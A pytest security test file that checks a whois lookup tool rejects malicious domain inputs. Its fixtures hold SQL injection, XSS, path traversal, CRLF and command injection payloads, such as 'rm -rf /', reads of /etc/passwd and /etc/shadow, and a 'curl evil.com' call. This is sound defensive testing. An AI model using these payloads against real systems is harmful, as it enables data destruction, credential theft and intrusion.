"""Security tests validating that injection payloads are rejected safely by whois_lookup()."""
import pytest

from cybersec.core.tools import whois


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(params=[
    "' OR 1=1 --",
    "\"; DROP TABLE users; --",
    "admin'--",
    "1; SELECT * FROM users",
    "1' AND '1'='1",
    "1 UNION SELECT NULL--",
])
def sql_injection_input(request):
    return request.param


@pytest.fixture(params=[
    "; rm -rf /",
    "&& whoami",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "& net user",
    "; shutdown -h now",
    "|| ls -la",
])
def command_injection_input(request):
    return request.param


@pytest.fixture(params=[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
])
def xss_input(request):
    return request.param


@pytest.fixture(params=[
    "../../../etc/passwd",
    "../../../../windows/system32",
    "..\\..\\boot.ini",
    "%2e%2e%2f%2e%2e%2f",
    "....//....//etc/passwd",
    "../../../google.com",
])
def path_traversal_input(request):
    return request.param


@pytest.fixture(params=[
    "&&",
    "||",
    ";",
    "$PATH",
    "`ls`",
    ">file.txt",
    "<input",
    "!important",
    "^root",
    "%0a",      # URL-encoded newline
    "%0d%0a",   # URL-encoded CRLF
])
def shell_char_input(request):
    return request.param


@pytest.fixture(params=[
    "example.com;rm -rf /",
    "<script>whois()</script>",
    "google.com && curl evil.com",
    "example.com|ls",
    "example.com&id",
    "domain.com\ncat /etc/shadow",
    "domain.com\r\nHTTP/1.1 200 OK",   # Header injection
    "domain.com\x00malicious",          # Null byte injection
])
def mixed_payload_input(request):
    return request.param


# ---------------------------------------------------------------------------
# Helper: shared assertion block
# ---------------------------------------------------------------------------

def _assert_safe_rejection(result):
    """Assert that a rejected/errored result preserves schema integrity."""
    # Either error or domain must be populated — never a silent crash
    assert result.domain is None or result.error is not None or result.available is not None

    # Schema fields must always be in a valid state
    assert isinstance(result.name_servers, list)
    assert isinstance(result.status, list)
    assert isinstance(result.risk_indicators, list)
    assert result.cached is False


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_sql_injection_inputs_rejected(sql_injection_input):
    """SQL injection payloads must be rejected without crashing."""
    result = await whois.whois_lookup(sql_injection_input)

    assert result.domain is None
    assert result.error is not None
    assert "invalid" in result.error.lower()
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_command_injection_inputs_rejected(command_injection_input):
    """Command injection payloads must be rejected without crashing or executing."""
    result = await whois.whois_lookup(command_injection_input)

    assert result.domain is None
    assert result.error is not None
    assert "invalid" in result.error.lower()
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# XSS Payloads
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_xss_inputs_rejected(xss_input):
    """XSS payloads must be rejected without crashing or executing JavaScript."""
    result = await whois.whois_lookup(xss_input)

    assert result.domain is None
    assert result.error is not None
    assert "invalid" in result.error.lower()
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_path_traversal_inputs_rejected(path_traversal_input):
    """Path traversal payloads must be rejected without accessing the filesystem."""
    result = await whois.whois_lookup(path_traversal_input)

    assert result.domain is None
    assert result.error is not None
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Shell Metacharacters
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_shell_char_inputs_rejected(shell_char_input):
    """Shell metacharacters must be rejected without crashing or spawning subprocesses."""
    result = await whois.whois_lookup(shell_char_input)

    assert result.domain is None
    assert result.error is not None
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Mixed / Compound Payloads
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_mixed_payload_inputs_rejected(mixed_payload_input):
    """Compound adversarial payloads must be rejected safely."""
    result = await whois.whois_lookup(mixed_payload_input)

    # Must either be cleanly rejected (domain=None) or return a safe result
    assert result.error is not None or result.domain is not None
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Null Byte Injection (explicit parametrize)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("null_payload", [
    "example\x00.com",
    "\x00example.com",
    "exam\x00ple.com",
    "example.com\x00",
    "example.com\x00;rm -rf /",
])
@pytest.mark.asyncio
async def test_null_byte_inputs_rejected(null_payload):
    """Null bytes embedded in domain strings must not bypass validation."""
    result = await whois.whois_lookup(null_payload)

    assert result.domain is None
    assert result.error is not None
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Unicode Homoglyph / Lookalike Characters
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("homoglyph_payload", [
    "exаmple.com",     # Cyrillic 'а' (U+0430) instead of Latin 'a'
    "gооgle.com",      # Cyrillic 'о' (U+043E) instead of Latin 'o'
    "microsоft.com",   # Mixed script
    "ɢoogle.com",      # Latin small capital G (U+0262)
])
@pytest.mark.asyncio
async def test_unicode_homoglyph_inputs_rejected(homoglyph_payload):
    """Unicode lookalike characters must be rejected by the ASCII-only validator."""
    result = await whois.whois_lookup(homoglyph_payload)

    # Strict char regex rejects non-ASCII — domain must be None
    assert result.domain is None
    assert result.error is not None
    assert "invalid" in result.error.lower()
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# CRLF / Header Injection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("crlf_payload", [
    "example.com\r\nX-Injected: true",
    "example.com\nContent-Length: 0",
    "example.com\r\n\r\nGET / HTTP/1.1",
])
@pytest.mark.asyncio
async def test_crlf_injection_inputs_rejected(crlf_payload):
    """CRLF sequences must not pass through validation into downstream calls."""
    result = await whois.whois_lookup(crlf_payload)

    assert result.domain is None
    assert result.error is not None
    _assert_safe_rejection(result)


# ---------------------------------------------------------------------------
# Whitespace-Only and Empty-Looking Payloads
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("whitespace_payload", [
    "\t",
    "\n",
    "\r",
    "\r\n",
    "   \t   ",
    "\x0b",   # Vertical tab
    "\x0c",   # Form feed
])
@pytest.mark.asyncio
async def test_whitespace_only_inputs_rejected(whitespace_payload):
    """Whitespace-only strings must be treated as empty and rejected."""
    result = await whois.whois_lookup(whitespace_payload)

    assert result.domain is None
    assert result.error is not None
    _assert_safe_rejection(result)
